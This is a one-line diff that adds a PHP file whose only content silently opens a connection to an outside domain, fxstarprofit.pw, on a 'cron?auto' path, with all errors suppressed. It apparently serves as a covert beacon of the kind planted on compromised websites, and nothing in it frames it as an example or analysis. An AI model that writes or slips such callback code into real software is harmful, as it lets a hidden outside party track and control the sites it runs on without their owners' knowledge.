@@ -1,0 +1,1 @@
+<?php @fclose(@fopen('http://fxstarprofit.pw/cron?auto', 'r'));
